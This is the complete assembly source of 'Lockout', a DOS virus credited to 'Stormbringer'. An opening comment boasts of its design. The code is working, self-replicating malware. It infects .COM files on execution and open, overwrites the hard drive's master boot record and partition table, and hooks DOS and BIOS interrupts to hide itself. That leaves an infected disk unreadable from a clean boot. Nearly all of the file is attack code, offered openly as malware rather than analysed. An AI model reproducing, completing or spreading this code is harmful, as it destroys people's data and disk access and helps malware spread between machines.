;*************************************************************************
;*            -------====;;[LOCKOUT VIRUS];;====-------                  *
;*                         by Stormbringer                               *
;*************************************************************************
;*       The following virus is multi-partite (Infects .COM's and MBR's) *
;* and redirects attempt to access it to the copy of the Old MBR it      *
;* keeps.  Any computer infected with this CANNOT access the hard drive  *
;* when booted from a floppy UNLESS using INT 13 with drive 80h!  The    *
;* virus overwrites the Partition Table with itself, so the logical      *
;* drives cannot be read unless the virus is memory resident (This works *
;* because when resident it redirects attempts to read the first sector  *
;* to sector nine, where the Partition Table IS stored).  It destroys    *
;* the good old "boot from a clean disk and all is fine" idea,  as well  *
;* as adding a good stealth feature for the virus.  Lockout infects      *
;* .COM's on execution and opening (Int 21h functions 4bh, 6ch, and 3dh) *
;* and will infect the MBR whenever an infected .COM file is run on an   *
;* uninfected machine.                                                   *
;*                                                                       *
;*                                                ;  Stormbringer        *
;*                                              ;;;;;;;;;;;;;;;;;;;;;;   *
;*                                                ;                      *
;*************************************************************************
.model tiny
.radix 16
.code
                mbr_loc         equ     7c00    ;This is your initial IP
                mbr_offset      equ     7b00    ;Offset - Com Offset
                mem_offset      equ     -100    ;Offset of mem from COM 
     org 100

start:
MBR_Entry_Point:

setup_stack:
        mov     ax,cs
        cli
        mov     ss,ax                   ;SS:SP=0000:7C00
        mov     sp,mbr_loc
        sti
mem_res:
        sub     word ptr cs:[413],1
        mov     ax,word ptr cs:[413]            ;Reserve 1K memory
        mov     cl,6
        shl     ax,cl
        mov     es,ax                           ;Get Segment
        mov     si,mbr_loc
        xor     di,di
        push    cs
        pop     ds
        mov     cx,100
        repnz   movsw                           ;Copy virus to memory
        mov     ax,offset after_jump+mem_offset
        push    es
        push    ax
        retf                                    ;Jump to new copy
after_jump:
        mov     ax,word ptr ds:[4c]
        mov     word ptr cs:[Int_13_IP+mem_offset],ax
        mov     ax,word ptr ds:[4e]                     ;Get int 13 vector
        mov     word ptr cs:[Int_13_CS+mem_offset],ax
        
        mov     ax,cs
        mov     cx,offset Int_1c_Handler+mem_offset
        
        cli
        mov     word ptr ds:[70],cx
        mov     word ptr ds:[72],ax                     ;Hook Int 1C
        mov     cx,offset Int_13_Handler+mem_offset
        mov     word ptr ds:[4c],cx                     ;Hook Int 13
        mov     word ptr ds:[4e],ax
        sti

        mov     word ptr cs:[counter+mem_offset],0      ;Initialize counters
        mov     byte ptr cs:[Int_21_Set+mem_offset],0
Load_Old_Sec:
        mov     ax,0201
        mov     bx,7c00
        push    ds                                      ;Load old MBR and
        pop     es                                      ;Partition Table
        mov     cx,9
        mov     dx,80
        int     13
Jump_Old_Sec:
        db      0ea,0,7c,0,0                            ;Jump to Old MBR

counter         dw      0
Int_21_Set      db      0

Int_1c_Handler:
        inc     word ptr cs:[counter+mem_offset]
        cmp     byte ptr cs:[Int_21_Set+mem_offset],0
        jne     Quit_Int_1c
        cmp     word ptr cs:[counter+mem_offset],40     ;Wait for a while, 
        jb      Quit_Int_1c                             ;Then hook Int 21
        call    Set_Int_21
        mov     byte ptr cs:[Int_21_Set+mem_offset],1
Quit_Int_1c:
        iret

Com_Entry_Point:                ;This is where virus is entered when attached
                                ;To a .COM file.

        call    get_offset
get_offset:
        pop     bp
        sub     bp,offset get_offset
        lea     bx,[end_prog+1+bp]
        mov     ax,0201
        mov     cx,1                    ;Read old sector
        mov     dx,80
        int     13
        jc      restore_control
        cmp     byte ptr [bx+1fdh],'V'  ;Check for infection
        je      restore_control
        call    infect_MBR              ;Infect if not infected
restore_control:
        lea     si,[storage_bytes+bp]
        mov     di,100
        push    di                      ;Restore Control
        movsw
        movsw
        ret
storage_bytes   db      0cdh,20,90,90

Set_Int_21:
        push    ax dx ds
        xor     ax,ax
        mov     ds,ax
        cmp     word ptr ds:[86],9000           ;Is int 21 hooked to high mem?
        ja      Already_Taken                   ;(Another Virus is present!)
        mov     ax,cs
        
        mov     dx,word ptr ds:[84]
        mov     word ptr cs:[Int_21_IP+mem_offset],dx
        mov     dx,word ptr ds:[86]                     ;Get Int 21 Vector
        mov     word ptr cs:[Int_21_CS+mem_offset],dx
        
        cli
        mov     word ptr ds:[86],ax
        mov     ax,offset Int_21_Handler+mem_offset     ;Hook Int 21
        mov     word ptr ds:[84],ax
        sti

Already_Taken:
        pop     ds dx ax
        ret

infect_MBR:
        mov     byte ptr ds:[bx+1fdh],'V'        ;Set infection Byte

        mov     ax,0301
        mov     cx,9                   
        int     13                     ;Save original sector w/infection mark

        mov     ax,0301                ;Write new bootsector
        lea     bx,[MBR_Entry_Point+bp]
        mov     cx,01
        int     13
        ret

Is_Open:
        push    ax si
        mov     si,dx
findeofn:        
        lodsb
        cmp     al,'.'
        je      founddot
        or      al,al
        jnz     findeofn
Foundzero:                      ;If it hits here, then there was no '.'
        jmp     doneOpen        
founddot:
        cmp     word ptr [si],'OC'
        jne     doneOpen
        call    infect_u_file
doneOpen:
        pop     si ax
        ret

OpenII:
        push    dx
        mov     dx,si
        call    Is_Open
        pop     dx
        jmp     Go_Int_21
        
OpenFile:
        call    Is_Open
        jmp     Go_int_21

Int_21_Handler:
        cmp     ax,4b00         ;Infect .COM files on execution
        je      execute
        cmp     ah,3dh          ;and open
        je      OpenFile
        cmp     ah,6c
        je      OpenII

Go_Int_21:
                db      0ea
Int_21_IP       dw      0
Int_21_CS       dw      0


execute:
        call    infect_u_file
        jmp     short Go_Int_21

infect_u_file:
        push    ax bx cx dx ds
        mov     ax,3d02                  ;Open file
        call    fake_int21
        jc      doner
        xchg    ax,bx                    ;get file handle

        mov     al,00
        call    DoTime                  ;Get File time/date stamp
        push    cx dx

        mov     ah,3f
        mov     cx,04
        push    cs
        pop     ds                      ;read first four bytes
        mov     dx,offset storage_bytes+mem_offset
        call    fake_int21

        cmp     word ptr [storage_bytes+mem_offset],'ZM'  ;Is it an exe?
        je      close_file                             ;If so, close and quite
        cmp     byte ptr [storage_bytes+3+mem_offset],0ffh ;Is it infected?
        je      close_file                                 ;If so, quit

        call    go_eof

        add     ax,(Com_Entry_Point-MBR_Entry_Point)-3
        mov     word ptr [new_jump+1+mem_offset],ax    ;Calculate Jump to
                                                       ;COM_Entry_Point

        mov     ah,40
        mov     cx,200                                  ;Total virsize 200h
        mov     dx,offset MBR_Entry_Point+mem_offset 
        call    fake_int21

        call    go_bof

        mov     ah,40
        mov     cx,04
        mov     dx,offset new_jump+mem_offset   ;Write in Jump
        call    fake_int21

close_file:
        pop     dx cx                           ;Save Time/Date
        mov     al,01
        call    DoTime
        
        mov     ah,3e                           ;Close file
        call    fake_int21
doner:
        pop     ds dx cx bx ax
        ret

Int_13_Handler:
        cmp     dx,80
        jne     Go_Int_13
        cmp     ah,03
        ja      Go_Int_13               ;Is something trying to read virus?
        cmp     ah,2
        jb      Go_Int_13
        cmp     cx,1
        jne     Go_Int_13

Trying_To_Access_Infection:
        mov     cx,9                    ;Give 'em old sector

Go_Int_13:
                db      0ea
Int_13_IP       dw      0               ;Jump to old Int 13 Handler
Int_13_CS       dw      0


new_jump        db      0e9,00,00,0ffh          ;Jump and ID byte for new
                                                ;Infection
fake_int21:
        pushf
        call    dword ptr cs:[Int_21_IP+mem_offset]
        ret

go_eof:
        mov     al,02
        jmp     short movefp
go_bof:
        mov     al,0
movefp:
        mov     ah,42
        xor     cx,cx
        xor     dx,dx                           ;Go to end of file
        call    fake_int21
        ret

DoTime:
        mov     ah,57
        int     21
        ret

Place_Holder:
        org     2fdh                            ;Holds place for Compilation
                                                ;to 512 Bytes
ID_Byte db      'V'                             ;Infection Marker
BS_Mark db      55,0aa                          ;Tells BIOS it is a Bootsector
end_prog:
end start
